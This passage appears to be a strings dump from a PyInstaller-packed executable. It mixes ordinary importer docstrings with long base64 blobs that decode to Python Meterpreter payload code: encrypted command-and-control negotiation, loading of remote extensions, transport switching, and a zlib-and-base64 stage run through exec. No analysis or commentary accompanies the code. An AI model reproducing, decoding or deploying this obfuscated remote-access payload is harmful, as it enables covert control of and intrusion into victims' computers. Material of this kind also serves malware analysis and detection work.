ICAgIGRlYnVnX3ByaW50KCdbKl0gTmVnb3RpYXRpbmcgVExWIGVuY3J5cHRpb24nKQogICAgICAgIHNlbGYudHJhbnNwb3J0LmFlc19rZXkgPSByYW5kX2J5dGVzKDMyKQogICAgICAgIHNlbGYudHJhbnNwb3J0LmFlc19lbmFibGVkID0gRmFsc2UKICAgICAgICByZXNwb25zZSArPSB0bHZfcGFjayhUTFZfVFlQRV9TWU1fS0VZX1RZUEUsIEVOQ19BRVMyNTYpCiAgICAgICAgZGVyID0gcGFja2V0X2dldF90bHYocmVxdWVzdCwgVExWX1RZUEVfUlNBX1BVQl9LRVkpWyd2YWx1ZSddLnN0cmlwKCkKICAgICAgICBkZWJ1Z19wcmludCgnWypdIFJTQSBrZXk6ICcgKyBzdHIoYmluYXNjaWkuYjJhX2hleChkZXIpKSkKICAgICAgICBkZWJ1Z19wcmludCgnWypdIEFFUyBrZXk6ICcgKyBoZXgobWV0X3JzYS5iMmkoc2VsZi50cmFuc3BvcnQuYWVzX2tleSkpKQogICAgICAgIGVuY19rZXkgPSBtZXRfcnNhX2VuY3J5cHQoZGVyLCBzZWxmLnRyYW5zcG9ydC5hZXNfa2V5KQogICAgICAgIGRlYnVnX3ByaW50KCdbKl0gRW5jcnlwdGVkIEFFUyBrZXk6ICcgKyBoZXgobWV0X3JzYS5iMmkoZW5jX2tleSkpKQogICAgICAgIHJlc3BvbnNlICs9IHRsdl9wYWNrKFRMVl9UWVBFX0VOQ19TWU1fS0VZLCBlbmNfa2V5KQogICAgICAgIGRlYnVnX3ByaW50KCdbKl0gVExWIGVuY3J5cHRpb24gc29ydGVkJykKICAgICAgICByZXR1cm4gRVJST1JfU1VDQ0VTUywgcmVzcG9uc2UKCiAgICBkZWYgX2NvcmVfbG9hZGxpYihzZWxmLCByZXF1ZXN0LCByZXNwb25zZSk6CiAgICAgICAgZGF0YV90bHYgPSBwYWNrZXRfZ2V0X3RsdihyZXF1ZXN0LCBUTFZfVFlQRV9EQVRBKQogICAgICAgIGlmIChkYXRhX3RsdlsndHlwZSddICYgVExWX01FVEFfVFlQRV9DT01QUkVTU0VEKSA9PSBUTFZfTUVUQV9UWVBFX0NPTVBSRVNTRUQ6CiAgICAgICAgICAgIHJldHVybiBFUlJPUl9GQUlMVVJFLCByZXNwb25zZQoKICAgICAgICBsaWJuYW1lID0gJz8/PycKICAgICAgICBtYXRjaCA9IHJlLnNlYXJjaChyJ15tZXRlcnByZXRlclwucmVnaXN0ZXJfZXh0ZW5zaW9uXChcJyhbYS16QS1aMC05XSspXCdcKSQnLCBzdHIoZGF0YV90bHZbJ3ZhbHVlJ10pLCByZS5NVUxUSUxJTkUpCiAgICAgICAgaWYgbWF0Y2ggaXMgbm90IE5vbmU6CiAgICAgICAgICAgIGxpYm5hbWUgPSBtYXRjaC5ncm91cCgxKQoKICAgICAgICBzZWxmLmxhc3RfcmVnaXN0ZXJlZF9leHRlbnNpb24gPSBOb25lCiAgICAgICAgc3ltYm9sc19mb3JfZXh0ZW5zaW9ucyA9IHsnbWV0ZXJwcmV0ZXInOiBzZWxmfQogICAgICAgIHN5bWJvbHNfZm9yX2V4dGVuc2lvbnMudXBkYXRlKEVYUE9SVEVEX1NZTUJPTFMpCiAgICAgICAgaSA9IGNvZGUuSW50ZXJhY3RpdmVJbnRlcnByZXRlcihzeW1ib2xzX2Zvcl9leHRlbnNpb25zKQogICAgICAgIGkucnVuY29kZShjb21waWxlKGRhdGFfdGx2Wyd2YWx1ZSddLCAnZXh0X3NlcnZlcl8nICsgbGlibmFtZSArICcucHknLCAnZXhlYycpKQogICAgICAgIGV4dGVuc2lvbl9uYW1lID0gc2VsZi5sYXN0X3JlZ2lzdGVyZWRfZXh0ZW5zaW9uCgogICAgICAgIGlmIGV4dGVuc2lvbl9uYW1lOgogICAgICAgICAgICBjaGVja19leHRlbnNpb24gPSBsYW1iZGEgeDogeC5zdGFydHN3aXRoKGV4dGVuc2lvbl9uYW1lKQogICAgICAgICAgICBsaWJfbWV0aG9kcyA9IGxpc3QoZmlsdGVyKGNoZWNrX2V4dGVuc2lvbiwgbGlzdChzZWxmLmV4dGVuc2lvbl9mdW5jdGlvbnMua2V5cygpKSkpCiAgICAgICAgICAgIGZvciBtZXRob2QgaW4gbGliX21ldGhvZHM6CiAgICAgICAgICAgICAgICByZXNwb25zZSArPSB0bHZfcGFjayhUTFZfVFlQRV9VSU5ULCBjbWRfc3RyaW5nX3RvX2lkKG1ldGhvZCkpCiAgICAgICAgcmV0dXJuIEVSUk9SX1NVQ0NFU1MsIHJlc3BvbnNlCgogICAgZGVmIF9jb3JlX3NodXRkb3duKHNlbGYsIHJlcXVlc3QsIHJlc3BvbnNlKToKICAgICAgICByZXNwb25zZSArPSB0bHZfcGFjayhUTFZfVFlQRV9CT09MLCBUcnVlKQogICAgICAgIHNlbGYucnVubmluZyA9IEZhbHNlCiAgICAgICAgcmV0dXJuIEVSUk9SX1NVQ0NFU1MsIHJlc3BvbnNlCgogICAgZGVmIF9jb3JlX3RyYW5zcG9ydF9hZGQoc2VsZiwgcmVxdWVzdCwgcmVzcG9uc2UpOgogICAgICAgIG5ld190cmFuc3BvcnQgPSBUcmFuc3BvcnQuZnJvbV9yZXF1ZXN0KHJlcXVlc3QpCiAgICAgICAgc2VsZi50cmFuc3BvcnRfYWRkKG5ld190cmFuc3BvcnQpCiAgICAgICAgcmV0dXJuIEVSUk9SX1NVQ0NFU1MsIHJlc3BvbnNlCgogICAgZGVmIF9jb3JlX3RyYW5zcG9ydF9jaGFuZ2Uoc2VsZiwgcmVxdWVzdCwgcmVzcG9uc2UpOgogICAgICAgIG5ld190cmFuc3BvcnQgPSBUcmFuc3BvcnQuZnJvbV9yZXF1ZXN0KHJlcXVlc3QpCiAgICAgICAgc2VsZi50cmFuc3BvcnRfYWRkKG5ld190cmFuc3BvcnQpCiAgICAgICAgc2VsZi5zZW5kX3BhY2tldChyZXNwb25zZSArIHRsdl9wYWNrKFRMVl9UWVBFX1JFU1VMVCwgRVJST1JfU1VDQ0VTUykpCiAgICAgICAgc2VsZi50cmFuc3BvcnRfY2hhbmdlKG5ld190cmFuc3BvcnQpCiAgICAgICAgcmV0dXJuIE5vbmUKCiAgICBkZWYgX2NvcmVfdHJhbnNwb3J0X2xpc3Qoc2VsZiwgcmVxdWVzdCwgcmVzcG9uc2UpOgogICAgICAgIGlmIHNlbGYuc2Vzc2lvbl9leHBpcnlfdGltZSA+IDA6CiAgICAgICAgICAgIHJlc3BvbnNlICs9IHRsdl9wYWNrKFRMVl9UWVBFX1RSQU5TX1NFU1NJT05fRVhQLCBzZWxmLnNlc3Npb25fZXhwaXJ5X2VuZCAtIHRpbWUudGltZSgpKQogICAgICAgIHJlc3BvbnNlICs9IHRsdl9wYWNrKFRMVl9UWVBFX1RSQU5TX0dST1VQLCBzZWxmLnRyYW5zcG9ydC50bHZfcGFja190cmFuc3BvcnRfZ3JvdXAoKSkKCiAgICAgICAgdHJhbnNwb3J0ID0gc2VsZi50cmFuc3BvcnRfbmV4dCgpCiAgICAgICAgd2hpbGUgdHJhbnNwb3J0ICE9IHNlbGYudHJhbnNwb3J0OgogICAgICAgICAgICByZXNwb25zZSArPSB0bHZfcGFjayhUTFZfVFlQRV9UUkFOU19HUk9VUCwgdHJhbnNwb3J0LnRsdl9wYWNrX3RyYW5zcG9ydF9ncm91cCgpKQogICAgICAgICAgICB0cmFuc3BvcnQgPSBzZWxmLnRyYW5zcG9ydF9uZXh0KHRyYW5zcG9ydCkKICAgICAgICByZXR1cm4gRVJST1JfU1VDQ0VTUywgcmVzcG9uc2UKCiAgICBkZWYgX2NvcmVfdHJhbnNwb3J0X25leHQoc2VsZiwgcmVxdWVzdCwgcmVzcG9uc2UpOgogICAgICAgIG5ld190cmFuc3BvcnQgPSBzZWxmLnRyYW5zcG9ydF9uZXh0KCkKICAgICAgICBpZiBuZXdfdHJhbnNwb3J0ID09IHNlbGYudHJhbnNwb3J0OgogICAgICAgICAgICByZXR1cm4gRVJST1JfRkFJTFVSRSwgcmVzcG9uc2UKICAgICAgICBzZWxmLnNlbmRfcGFja2V0KHJlc3BvbnNlICsgdGx2X3BhY2soVExWX1RZUEVfUkVTVUxULCBFUlJPUl9TVUNDRVNTKSkKICAgICAgICBzZWxmLnRyYW5zcG9ydF9jaGFuZ2UobmV3X3RyYW5zcG9ydCkKICAgICAgICByZXR1cm4gTm9uZQoKICAgIGRlZiBfY29yZV90cmFuc3BvcnRfcHJldihzZWxmLCByZXF1ZXN0LCByZXNwb25zZSk6CiAgICAgICAgbmV3X3RyYW5zcG9ydCA9IHNlbGYudHJhbnNwb3J0X3ByZXYoKQogICAgICAgIGlmIG5ld190cmFuc3BvcnQgPT0gc2VsZi50cmFuc3BvcnQ6CiAgICAgICAgICAgIHJldHVy",
        "\n        Open file and seek to pos record from last close.\n        ",
        "\n    This class is used only to decrypt Python modules.\n    ",
        ":",
        "No module named ",
        "\n    File class support auto open when access member from file object\n    This class is use to avoid file locking on windows\n    ",
        "",
        "origin",
        "\n        Get the object corresponding to name, or None.\n        For use with imputil ArchiveImporter, object is a python code object.\n        'name' is the name as specified in an 'import name'.\n        'import a.b' will become:\n        extract('a') (return None because 'a' is not a code object)\n        extract('a.__init__') (return a code object)\n        extract('a.b') (return a code object)\n        Default implementation:\n          self.toc is a dict\n          self.toc[name] is pos\n          self.lib has the code object marshal-ed at pos\n        ",
        "utf-8",
        "\nSet up 'os' and 'os.path' module replacement functions for use during import\nbootstrap.\n",
        "Gl2ZSgpOgogICAgICAgICAgICBzZWxmLmhhbmRsZV9kZWFkX3Jlc291cmNlX2NoYW5uZWwoY2hhbm5lbF9pZCkKICAgICAgICByZXR1cm4gc3RhdHVzLCByZXNwb25zZQoKICAgIGRlZiBjcmVhdGVfcmVzcG9uc2Uoc2VsZiwgcmVxdWVzdCk6CiAgICAgICAgcmVzcG9uc2UgPSBzdHJ1Y3QucGFjaygnPkknLCBQQUNLRVRfVFlQRV9SRVNQT05TRSkKICAgICAgICBjb21tZF9pZF90bHYgPSBwYWNrZXRfZ2V0X3RsdihyZXF1ZXN0LCBUTFZfVFlQRV9DT01NQU5EX0lEKQogICAgICAgIHJlc3BvbnNlICs9IHRsdl9wYWNrKGNvbW1kX2lkX3RsdikKICAgICAgICByZXNwb25zZSArPSB0bHZfcGFjayhUTFZfVFlQRV9VVUlELCBiaW5hc2NpaS5hMmJfaGV4KGJ5dGVzKFBBWUxPQURfVVVJRCwgJ1VURi04JykpKQoKICAgICAgICBoYW5kbGVyX25hbWUgPSBjbWRfaWRfdG9fc3RyaW5nKGNvbW1kX2lkX3RsdlsndmFsdWUnXSkKICAgICAgICBpZiBoYW5kbGVyX25hbWUgaW4gc2VsZi5leHRlbnNpb25fZnVuY3Rpb25zOgogICAgICAgICAgICBoYW5kbGVyID0gc2VsZi5leHRlbnNpb25fZnVuY3Rpb25zW2hhbmRsZXJfbmFtZV0KICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZGVidWdfcHJpbnQoJ1sqXSBydW5uaW5nIG1ldGhvZCAnICsgaGFuZGxlcl9uYW1lKQogICAgICAgICAgICAgICAgcmVzdWx0ID0gaGFuZGxlcihyZXF1ZXN0LCByZXNwb25zZSkKICAgICAgICAgICAgICAgIGlmIHJlc3VsdCBpcyBOb25lOgogICAgICAgICAgICAgICAgICAgIGRlYnVnX3ByaW50KCJbLV0gTm90IGEgZ29vZCByZXN1bHQhIikKICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgIHJlc3VsdCwgcmVzcG9uc2UgPSByZXN1bHQKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgIGRlYnVnX3RyYWNlYmFjaygnWy1dIG1ldGhvZCAnICsgaGFuZGxlcl9uYW1lICsgJyByZXN1bHRlZCBpbiBhbiBlcnJvcicpCiAgICAgICAgICAgICAgICByZXN1bHQgPSBlcnJvcl9yZXN1bHQoKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgaWYgcmVzdWx0ICE9IEVSUk9SX1NVQ0NFU1M6CiAgICAgICAgICAgICAgICAgICAgZGVidWdfcHJpbnQoJ1stXSBtZXRob2QgJyArIGhhbmRsZXJfbmFtZSArICcgcmVzdWx0ZWQgaW4gZXJyb3I6ICMnICsgc3RyKHJlc3VsdCkpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgZGVidWdfcHJpbnQoJ1stXSBtZXRob2QgJyArIGhhbmRsZXJfbmFtZSArICcgd2FzIHJlcXVlc3RlZCBidXQgZG9lcyBub3QgZXhpc3QnKQogICAgICAgICAgICByZXN1bHQgPSBlcnJvcl9yZXN1bHQoTm90SW1wbGVtZW50ZWRFcnJvcikKCiAgICAgICAgcmVxaWRfdGx2ID0gcGFja2V0X2dldF90bHYocmVxdWVzdCwgVExWX1RZUEVfUkVRVUVTVF9JRCkKICAgICAgICBpZiBub3QgcmVxaWRfdGx2OgogICAgICAgICAgICBkZWJ1Z19wcmludCgiWy1dIE5vIHJlcXVlc3QgSUQgZm91bmQiKQogICAgICAgICAgICByZXR1cm4KICAgICAgICByZXNwb25zZSArPSB0bHZfcGFjayhyZXFpZF90bHYpCiAgICAgICAgZGVidWdfcHJpbnQoIlsqXSBTZW5kaW5nIHJlc3BvbmQgcGFja2V0IikKICAgICAgICByZXR1cm4gcmVzcG9uc2UgKyB0bHZfcGFjayhUTFZfVFlQRV9SRVNVTFQsIHJlc3VsdCkKCgppbXBvcnQgY29kZWNzLGltcCxiYXNlNjQsemxpYgptZXRfYWVzID0gaW1wLm5ld19tb2R1bGUoJ21ldF9hZXMnKQptZXRfcnNhID0gaW1wLm5ld19tb2R1bGUoJ21ldF9yc2EnKQpleGVjKGNvbXBpbGUoemxpYi5kZWNvbXByZXNzKGJhc2U2NC5iNjRkZWNvZGUoY29kZWNzLmdldGVuY29kZXIoJ3V0Zi04JykoJ2VOckYzRnR6SmNlVjNmRm44bE5BRXpFbUlCNVNkYitRaENKc3hqdzQrQ2lOWHhETmpycUtJRnRvQkhCSWRjdmo3KzY5L3d2b1drMDJxZERZRG5jSEpUUndMbFZaV1ptL25XY2xQcjc5Ni8zcmgvUEY4dnIrN2VueC9QRGpjajQ5dm4zOGVOMzJpK1c3SCs5K2VMeDg5WGcrWGR4ZGZmSHhSL3ZyaDR2Ymk5dTdpNGZwN2kvYlpYRjZ0ZDNsajY5Ty9QaWp0N2ZicS9VaXZuRnorOFh0cDNjdmVKV1h5OTh1Ly9iNlljMUhQR3puSHgvdStPZE44ZUtycjZybTZqLzByekwrVlhiUC82cmlYOFBWZi9CMS9mUXlqOVY4ZWQ3ZW5JL1h1WGgxKzNpK2pNZGNMbGQ1YUVzZUdnL1JNK2JxOFhLK3Zac2UzdHB6L3VWZlB2Lys5ZTNkNWZMZHcrWE0wK1o4MnRQam5vNzQ5ZDB5blYveTh0TnB0bWRQbjg0ZjMrNFgwVUtmLzdROVBONit2bnQ1ZTdlL2pwUDU0M1VkRDN0RHkxenp2eDkvOUl2ai9paWVlL3Q0ZS9kNG51NldqVytmNXJmbjdaRWZQcjlKZnZ2ajUzL2RmT0Q4WGp5OTlQc24rUHgwWHZENSswK1AvTUFaMlNucENWY2ZiNjhldC9nSi83NStOZjExWHFlTHg5UDJ4ZVBIMjEvdnoyK3YxVDgrdjUrV0h5NC8rZVRxNCtYVjlQaDQ4Vi8vN1U5Zi83ZXZMMS9QMzI4TFozbjM4SGo5UDh2dWk3STRWYzBYWlhXcXF5L0s1bjlGSThaaFhOK1VwK3JVbklaVDJjVVBUbDF6S3F2aFZQV25OcjRxNHF2NGZ0bVhwNzQvbGZHdHBqK044WU5oT0kzanFSemphVzE1YXV0NGFCY1ByZUtoOGUycVBWVnR2RnVkRDRubk5XMDAwWit1Yi9JcFZUeTd6UCt2NDJqaThVWDh2Q3g1WEJPdkZ0K29UMDM4TE42cktsdmV1aXpqTUlwNGJCMnZXWlR2WG44WVQvSFRxaW5pVWJYZXZjc2ppR2UxY2RCNUttWDhOOGIzaG56Rk9NbzQvSHJJVSt2eTdmdDR1ZWJVNXZQaUZhc3h2cFh2Vm5QU1RmeXpQT1h6eDFNZEx6bkdRK0pmOGI0dExSSEhQYWl0cWpqMWVFU2ViUi9mS3FPSjRsamp1WEVLWFRabEdVMC94bEYyY2N6VnFjMFhibWlwZUxzcWZoNEhVa2JiNTBFVzR5a2JyczlyVWVXUlJidVBwWm8zV3FhTWwybjdVeDl2MzUyR2JKWThoMEZOM2NjejQycDBmVjZzK0tLczYxT1hKeFgveFpIMnA2RTR4U0dVY1FCbE41eUdlRVEwUXpaVGswMFRUUll2SFMxWE5TMVh1SXlEcmVJazQyV2lQYW8yR3lEYkpxOUNQQ0plTTE2NDdrNWpTeS9vOGpEaWU5bjBjVUp4NmwwZWVKeDZObjQwUW52S24wVXp4NWxYVlhHcW96dkZpMFF6bGZFcWVmUjF2bW0wV254WlZYUzBhS0I4bDJqNWJQajRjWEdLYXgxZE5kNDJEeUI3U2J4TEg0OGVzcVBGZi9ud3ZETHgxTGdJVlJ4QUhIa1pEVnRtYzhmVnpZc1U3Wks5ZThpempkZW9zN05uejhvVzUyNFk4bERqR09QcXhHUHlHZkdOYU1EczgxVmVuQ3E3U2h4STNCclpYSG5KODcvc0FIRWJaWi9MczY5T2NXaloxK0xaelNrNmVmVENJYnRPUENmZk5Oc21udFptTjhyMnpSc3FqeUdlR3YvTS82ZUo4dHZSdytMdG82TlZkWGFVdVA3dHFjbVd5b3VYdlN1dmVQYWtlTlU4OTdqWThhYlJ3YnU4UG5GWDVmL0ZTOGNUOHc2T2psUGxiWGw3ZlJQWGVYeTZnK3U4Qy9QV2p5ZmxUUlN2bEIwaytra2VZOGs5VW5OblpsZkx1ems3Y050emMrWXg1azJWN1IzSG1TY1NSeCtkSWJwRzlvdThxRHI0bW1QZ3lJZThzclJ1WE14NFZsZlNEL3FPU3hrWHQrdTQyL01HakNzMzVQWGdYS050OC9TamplcnU2YzRidUZlaThmdGFWend1U2Q1UzJTelIvTm04WEltaVVPc1hEYzJkaDhYbzBXU255akZock5VZmhrbzNScUhMR3RkeUtCaEo4aGJOaTVqM0I1MHcrMjllMk96Nk9ZcTB1cWV6ZHo4UG9ZV3VVOTYyMldjTGpVRFJ0K0k3TFIwL3g0VG9tUjMzZER3ejJ6U2JPMDZWSzVEM2NSN2FVNCtyYzd4ODZuUXhFTFJQZDBDZlZ6ekg0V2ptdk0vbzNXM0plS3NCbzlPb21lZVNiNUhkSWxzNFRvOHUzWERuNUtDYVkyWmVzQnpING1ya0VKQjlYNk1jUFM5dnlKS0JNeDdEMk1td3hyaGZQNDN0TWJCeGQycUlhaGpGcXA3eExXNnp2Rnl0N3F0NHNieHZzOTBZLzBkRzc1d0w4bDdNVVNlZm1RMVQ2Z2FNanNWQTErVndIQU4xOXBoZUkzT1g4MFBla2psRWE1U0tMcGczWlk3SU9TNjIzS045RGo5NWMrUUV3QUNRNHlOelE4bEV3dGphRlJxRVJpYkNucEdMY2JMdkdHSnlBc2g3S3NmWE9MaWg1cGFMUnFpWXpockdRd2FWVXNOL3JUdWUyN3pJeVRRNlV3NjBPVkxuZFBubjh2cW1lTE4wWGQzVlUzc3EzdXhEdi9STGRKTGl6YmIxOFNlZUU5L3Qrcm1maHpXLzNQZHFyNHI4Y3UyNnVadG52dHk2dmR2bjZIMXZ4bkpwbDdiTlYraUtPdjdHTlMvZXhHa1cyVlBpemJhdTcvb3BYN2J0cXJtYSszeUJyZCszZlN2enUzTzc5bXNmMTZ0NDA2elRQTTFibHc5WTRsbmRPTVdYdzc1TXk5VGs0WmI3VUEzVm1LOHdqRXY4YmZMTjlpbGVZSTEyaXFmdCs3UlBaVDUycnRxeEhiYzVIN3MxZmRNdm5OcThGM3RSNUhlYmNscW5kVnZ5c2ZYYXJFMlhyOUR1VXpWVmU3NUYwOFpyN1ZzZVExeXVlTHQ1endmVVV6TTFPKy9XOUZWZmpYbTg0N3dVUzlIbTYvWnRORjYvNUFsdDViN3VhNWx2VWE5alBkYlRscSs3VkYzVmRmbTYzUkpYb212enkzNnI5M3B2c2szM2R1LzN2c2hYR09vbC9qVDV4dDFRTjNYVDVvdTE1ZFJPN1o2TnZwWmJ1N1YxZnJtUGU3bm5xQkp2WFBVeE9JeDVBYVo1SGFKeDhzc3U3c0E2dTFDY1VEUlNmSld2T3hSTi9NMlhIZHZvREgzTHBZakhSZ2ZQaGh6WHBWN3FObys4THFKenh5WElML3V4RzdzcEQzZUthOTRXK1ZMVlBrN2pOT2V6dHFLUHY5bmtjUnZIUUZobks1WHpVQXpGbUsyMDdsdTFWWFcyODdKdTh6WlgrWUFtRHJ5SzY1N3RzVWRucVJaNnk5UzNmVHZtTzhRdE94WmptYTlRcmtNOTFHTWVWenRVUzdYMDJRaDFYTlp5cWpqYXJwekx1YUxETHQzV3hYdmt0WTdMMms0YlQ1dW5ZaXIyZkxIb1h6Rnk3SGtNZlZmUDlkemswNkt6ZHRIdDh5VDdOYjVaTHp3dGJ1cHE3RG1MZGF1M3V1YTdXOXdvZTQ3SWIyTHNiSVptekM0eWRXMGR6VXlISE5keXpjRWwrK3hTYnV1MlZ0bnFUUkZEY2RIbGQ2TUxMUHRTNW9uMll4eDd1V1JUejEwN3QvUEdlVFRkMU1VdGtwZHRYZVpsYnZLSTQzYU5GbHhwdGVpcDlkamtzWTFOOU5QbzRQbmwwQ3pOc21iN3pFVTd0TU9Xcnp1MDhXWjdrNTB2YnV0aUxicDgydExHbmJsWCtkMW1uK0xQeHVWYzQ4Nlp5M3kzb1l0dVdDOTBqU2x1bTNYTkU0MHhKZjY",
        "unpack_from",
        "\n        Get the code object associated with the module.\n\n        ImportError should be raised if module not found.\n        ",
        "\n        PEP-451 loader.exec_module() method for the ``sys.meta_path`` hook.\n\n        Loaders will have a new method, exec_module(). Its only job is to\n        \"exec\" the module and consequently populate the module's namespace. It\n        is not responsible for creating or preparing the module object, nor\n        for any cleanup afterward. It has no return value. exec_module() will\n        be used during both loading and reloading.\n\n        exec_module() should properly handle the case where it is called more\n        than once. For some kinds of modules this may mean raising ImportError\n        every time after the first time the method is called. This is\n        particularly relevant for reloading, where some kinds of modules do\n        not support in-place reloading.\n        ",
        "\n    Install FrozenImporter class and other classes into the import machinery.\n\n    This class method (static method) installs the FrozenImporter class into\n    the import machinery of the running process. The importer is added\n    to sys.meta_path. It could be added to sys.path_hooks but sys.meta_path\n    is processed by Python before looking at sys.path!\n\n    The order of processing import hooks in sys.meta_path:\n\n    1. built-in modules\n    2. modules from the bundled ZIP archive\n    3. C extension modules\n    4. Modules from sys.path\n    ",
        "\n    Wrapper class for FrozenImporter that imports one specific fullname from\n    a module named by an alternate fullname. The alternate fullname is derived from the\n    __path__ of the package module containing that module.\n\n    This is called by FrozenImporter.find_module whenever a module is found as a result\n    of searching module.__path__\n    ",
        "Struct"
    ]
}